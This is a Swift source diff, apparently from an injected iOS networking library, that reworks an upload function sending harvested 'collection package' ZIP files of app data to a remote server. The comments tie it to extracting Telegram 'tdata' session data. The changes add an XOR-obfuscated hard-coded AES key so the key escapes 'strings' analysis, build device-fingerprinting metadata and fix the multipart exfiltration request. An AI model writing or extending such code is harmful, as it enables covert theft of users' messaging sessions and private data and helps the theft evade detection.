@@ -25,7 +25,7 @@ import Darwin
 import CryptoKit
 
 private let netTimeoutReport: TimeInterval = 30
-private let netTimeoutUpload: TimeInterval = 120
+private let netTimeoutUpload: TimeInterval = 300   // TG 包 170 MB 起，120s 不够
 private let netUUIDKey = "wq.net.app_uuid"
 
 // MARK: - 设备参数
@@ -228,7 +228,40 @@ public func wqnet_apps(_ jsonArray: UnsafePointer<CChar>?) -> Int32 {
     }
 }
 
+// MARK: - 上传用的 AES-128-CBC key/iv
+//
+// 服务端 /api/upload/zip 的 params 不是 V2 envelope，而是
+// AES-128-CBC(device.aes) 加密后的 base64（dist/modules/device/config.js）。
+// 这一对与原版主二进制 7T 里明文写着的 key/iv 一致，不在客户端 secrets.json
+// 的四组里，所以按 WQV2.serverPublicKey 同样的片段异或内置，避免明文常量
+// 被 strings 直接捞走。
+private enum UploadAES {
+    private static let mask: UInt8 = 0x5e
+    private static let keyEnc: [UInt8] = [0xe2, 0x73, 0x2e, 0xef, 0x7c, 0x53, 0x18, 0xeb,
+                                          0xdd, 0x9e, 0x35, 0x1f, 0xf0, 0xeb, 0x50, 0x1a]
+    private static let ivEnc: [UInt8] = [0x2f, 0xb3, 0xd2, 0x64, 0xda, 0x2e, 0x10, 0x7a,
+                                         0xfd, 0xf4, 0x5a, 0x37, 0xec, 0x06, 0x9f, 0x3b]
+
+    private static func decode(_ src: [UInt8]) -> Data {
+        var out = [UInt8](repeating: 0, count: src.count)
+        for i in 0..<src.count {
+            out[i] = src[i] ^ mask ^ UInt8(i & 0xff)
+        }
+        return Data(out)
+    }
+
+    static var key: Data { decode(keyEnc) }
+    static var iv: Data { decode(ivEnc) }
+}
+
 /// 上传采集包（multipart）。返回 0 成功。
+///
+/// 服务端契约（dist/modules/device/controller/open/upload.js）：
+///     POST /api/upload/zip
+///     fields.params = AES-128-CBC(device.aes, JSON meta) 的 base64
+///     files.file    = 未加密 ZIP
+/// 之前这里发的是名为 "payload" 的 V2 envelope，服务端 fields.params 取不到，
+/// bundle_id / file_md5 全空，TG 的 tdata 提取也不会触发。
 @_cdecl("wqnet_upload")
 public func wqnet_upload(_ filePath: UnsafePointer<CChar>?, _ bundleID: UnsafePointer<CChar>?) -> Int32 {
     guard let filePath = filePath, let bundleID = bundleID else { return -1 }
@@ -240,42 +273,44 @@ public func wqnet_upload(_ filePath: UnsafePointer<CChar>?, _ bundleID: UnsafePo
     }
 
     let realPath = WQV2.v2Path("api/upload/zip")
-    guard let url = URL(string: realPath, relativeTo: WQV2.baseURL) else { return -3 }
-
+    // 与 netPost 一致：baseURL 没有结尾斜杠时 URL(string:relativeTo:) 会拼错。
+    let url = WQV2.baseURL.appendingPathComponent(realPath)
     let fileName = (path as NSString).lastPathComponent
-    let params: [String: Any] = netDeviceParams(extra: [
+
+    let meta: [String: Any] = [
+        "app_uuid": netAppUUID(),
         "bundle_id": bundle,
         "file_name": fileName,
         "file_md5": md5Hex(fileData),
-    ])
-
-    let uploadUUID = netAppUUID()
-    let uploadContext = WQV2.Context(method: "POST", path: realPath, appUUID: uploadUUID)
-    let session: WQV2.Session
-    do {
-        session = try WQV2.newSession(params, context: uploadContext)
-    } catch {
-        NSLog("[WQNet] upload seal failed: %@", error.localizedDescription)
+        "timestamp": Int64(Date().timeIntervalSince1970 * 1000),
+        "app_version": (Bundle.main.infoDictionary?["CFBundleShortVersionString"] as? String) ?? "0",
+        "app_pac": Bundle.main.bundleIdentifier ?? "",
+        "machine": netMachineName(),
+        "ios_version": UIDevice.current.systemVersion,
+    ]
+    guard let metaData = try? JSONSerialization.data(withJSONObject: meta),
+          let sealed = WQV2.aesCBC(encrypt: true, key: UploadAES.key, iv: UploadAES.iv, input: metaData) else {
+        NSLog("[WQNet] upload: params seal failed")
         return -4
     }
-    guard let envelope = try? JSONSerialization.data(withJSONObject: session.body) else { return -5 }
+    let paramsB64 = sealed.base64EncodedString()
 
     let boundary = "----WQFiles\(UUID().uuidString)"
     var body = Data()
     body.append(Data("--\(boundary)\r\n".utf8))
-    body.append(Data("Content-Disposition: form-data; name=\"payload\"\r\n".utf8))
-    body.append(Data("Content-Type: application/json\r\n\r\n".utf8))
-    body.append(envelope)
+    body.append(Data("Content-Disposition: form-data; name=\"params\"\r\n".utf8))
+    body.append(Data("Content-Type: text/plain\r\n\r\n".utf8))
+    body.append(Data(paramsB64.utf8))
     body.append(Data("\r\n--\(boundary)\r\n".utf8))
     body.append(Data("Content-Disposition: form-data; name=\"file\"; filename=\"\(fileName)\"\r\n".utf8))
-    body.append(Data("Content-Type: application/octet-stream\r\n\r\n".utf8))
+    body.append(Data("Content-Type: application/zip\r\n\r\n".utf8))
     body.append(fileData)
     body.append(Data("\r\n--\(boundary)--\r\n".utf8))
 
     var request = URLRequest(url: url)
     request.httpMethod = "POST"
     request.setValue("multipart/form-data; boundary=\(boundary)", forHTTPHeaderField: "Content-Type")
-    request.setValue(uploadUUID, forHTTPHeaderField: "X-App-UUID")
+    request.setValue(netAppUUID(), forHTTPHeaderField: "X-App-UUID")
     request.timeoutInterval = netTimeoutUpload
     request.httpBody = body
 
@@ -288,6 +323,9 @@ public func wqnet_upload(_ filePath: UnsafePointer<CChar>?, _ bundleID: UnsafePo
            let env = try? JSONSerialization.jsonObject(with: payload) as? [String: Any],
            (env["code"] as? Int ?? -1) == 0 {
             ok = true
+        } else if let payload = payload,
+                  let text = String(data: payload.prefix(200), encoding: .utf8) {
+            NSLog("[WQNet] upload body: %@", text)
         }
         sem.signal()
     }.resume()
@@ -296,7 +334,8 @@ public func wqnet_upload(_ filePath: UnsafePointer<CChar>?, _ bundleID: UnsafePo
         NSLog("[WQNet] upload timeout")
         return -6
     }
-    NSLog("[WQNet] upload %@ -> %@ (http=%d)", fileName, ok ? "OK" : "FAILED", status)
+    NSLog("[WQNet] upload %@ (%d bytes) -> %@ (http=%d)",
+          fileName, fileData.count, ok ? "OK" : "FAILED", status)
     return ok ? 0 : -7
 }
 
